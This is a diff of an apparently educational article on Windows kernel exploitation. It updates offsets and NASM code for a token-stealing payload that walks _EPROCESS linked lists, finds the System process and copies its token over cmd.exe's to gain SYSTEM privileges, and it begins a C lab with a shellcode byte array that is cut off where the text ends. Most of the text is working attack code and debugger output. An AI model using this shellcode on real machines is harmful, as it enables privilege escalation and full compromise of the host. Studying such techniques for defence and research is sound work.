@@ -64,19 +64,19 @@ The first technique we’re going to cover is **Token Stealing**, which simply i
 
 In the exploited process, we need to locate the `_EPROCESS` structure, which is the kernel representation of a process object. Like many other Windows structures, `_EPROCESS` is located at a fixed offset from other elements, which are eventually dependent on constants. In our case, the constant is the **`GS`** register, and at offset `0x188`, we can find the `_KTHREAD` of the current process. We’ll save it in the **`r9`** register for later use:
 ```nasm
-mov r9, qword ptr gs:[0x188]
+mov r9, qword gs:[0x188]
 ```
 
 Now that we’ve stored the `_KTHREAD` in **`r9`**, we can use it to locate the `_EPROCESS`, which is `0x220` bytes away (**EPROCESS** = **KTHREAD** + ``0x220``):
 ```
-lkd> dt _KTHREAD Process
-nt!_KTHREAD
-   +0x220 Process : Ptr64 _KPROCES
+2: kd> dt _KTHREAD Process
+ntdll!_KTHREAD
+   +0x220 Process : Ptr64 _KPROCESS
 ```
 
 Translated into:
 ```nasm
-mov r9, qword ptr[r9+0x220]
+mov r9, qword [r9+0x220]
 ```
 
 Since we want to elevate the privileges of the parent process, we need to find the Process ID of ``cmd.exe``. We also realize that this offset differs from older Windows 10 versions.
@@ -86,68 +86,66 @@ Since we want to elevate the privileges of the parent process, we need to find t
 
 Theoretically, we should be checking ``conhost.exe``, meaning we should go one layer deeper—our PPID should be ``0x1a8c``.
 ```
-kld> dt _EPROCESS
-+0x3e8 InheritedFromUniqueProcessId : Ptr64 Void
+2: kd> dt nt!_EPROCESS InheritedFromUniqueProcessId
+   +0x540 InheritedFromUniqueProcessId : Ptr64 Void
 ```
 
 In nasm:
 ```nasm
-mov r8, qword ptr[r9+0x3e8] ; new offset, previous was 3e0
+mov r8, qword [r9 + 0x540]
 ```
 
-We’ve now saved the PID of `cmd.exe`, but before proceeding, we need to locate its `_EPROCESS` address in memory. If we inspect the current process (`kscldr.exe`), we can see that at offsets `0x2e8` and `0x2f0` we have `UniqueProcessId` and `ActiveProcessLinks`. The latter is a linked list of `_EPROCESS` objects that can be traversed and compared against the `cmd.exe` PID stored in `r8`.
+We’ve now saved the PID of `cmd.exe`, but before proceeding, we need to locate its `_EPROCESS` address in memory. If we inspect the current process (`kscldr.exe`), we can see that at offsets `0x440` and `0x448` we have `UniqueProcessId` and `ActiveProcessLinks`. The latter is a linked list of `_EPROCESS` objects that can be traversed and compared against the `cmd.exe` PID stored in `r8`.
 ```python
-lkd> dx @$cursession.Processes[6076]
-  [+0x000] Pcb              [Type: _KPROCESS]
-    [+0x2e0] ProcessLock      [Type: _EX_PUSH_LOCK]
-    [+0x2e8] UniqueProcessId  : 0x17bc [Type: void *]
-    [+0x2f0] ActiveProcessLinks [Type: _LIST_ENTRY]
+2: kd> dt _EPROCESS
+ntdll!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+...
+   +0x440 UniqueProcessId  : Ptr64 Void
+   +0x448 ActiveProcessLinks : _LIST_ENTRY
+...
 ```
 
 Which results in:
 ```nasm
-mov rax, r9
-loop1:
-	mov rax, qword ptr [rax + 0x2f0]
-	sub rax, 0x2f0
-	cmp qword ptr[rax + 0x2e8],r8
-	jne loop1
+		loop1:
+			mov r9, qword [r9+0x448]
+			sub r9, 0x448
+			mov r10, qword [r9+0x440]
+			cmp r10, r8
+			jne loop1
 ```
 
-Once we've found the `cmd.exe` `_EPROCESS` structure, we can inspect it and find at offset `0x360` the token object:
+Once we've found the `cmd.exe` `_EPROCESS` structure, we can inspect it and find at offset `0x4b8` the token object:
 ```
-lkd> dx -id 0,0,ffffa88f4ce8e080 -r1 (*((ntkrnlmp!_EPROCESS *)0xffffa88f4ce8e080))
-(*((ntkrnlmp!_EPROCESS *)0xffffa88f4ce8e080))                 [Type: _EPROCESS]
-    [+0x000] Pcb              [Type: _KPROCESS]
-    [+0x2e0] ProcessLock      [Type: _EX_PUSH_LOCK]
-    [+0x2e8] UniqueProcessId  : 0x17bc [Type: void *]
-    [...]
-    [+0x360] Token            [Type: _EX_FAST_REF]
+2: kd> dt _EPROCESS Token
+ntdll!_EPROCESS
+   +0x4b8 Token : _EX_FAST_REF
 ```
 
 Store that in the ``rcx`` register:
 ```nasm
-mov rcx, rax
-add rcx, 0x360
+		mov rax, r9
+		add rax, 0x4b8
 ```
 
 Now we just need to find the `System` process (PID 4) and extract its token. We loop through the same linked list as before until we find a process with ID 4:
 ```nasm
-mov rax, r9
-loop2:
-	mov rax, qword ptr [rax +0x2f0].
-	sub rax, 0x2f0
-	cmp [rax + 0x2e8], 4
-	jne loop2
-	mov rdx, reax
-	add rdx, 0x360
+		mov rax, r9								  ; get the cmd.exe's token
+		loop2:
+			mov r9, qword [r9+0x448]
+			sub r9, 0x448
+			mov r10, qword [r9+0x440]
+			cmp r10, 4
+			jne loop2
 ```
 
 Finally, we overwrite the existing `cmd.exe` token (stored in `rcx`) with the System token (stored in `rdx`):
 ```nasm
-mov rdx, qword ptr [rdx]
-mov qword ptr [rcx], rdx
-ret
+		mov r9, qword [r9+0x4b8]
+		mov [rax], r9
+
+		ret
 ```
 
 ### Token Stealing Lab
@@ -159,7 +157,7 @@ First, let’s create a C program that allocates a usermode buffer. Then, we’l
 
 #pragma comment(lib,"KtmW32.lib")
 
-// buffer que vamos a asignar para que el kernel lo ejecute
+// Kernel mode shellcode
 char charShellcode[] = {
 	0x90, 0x65, 0x4C, 0x8B, 0x0C, 0x25, 0x88, 0x01, 0x00, 0x00, 
 	0x4D, 0x8B, 0x89, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x8B, 0x81, 
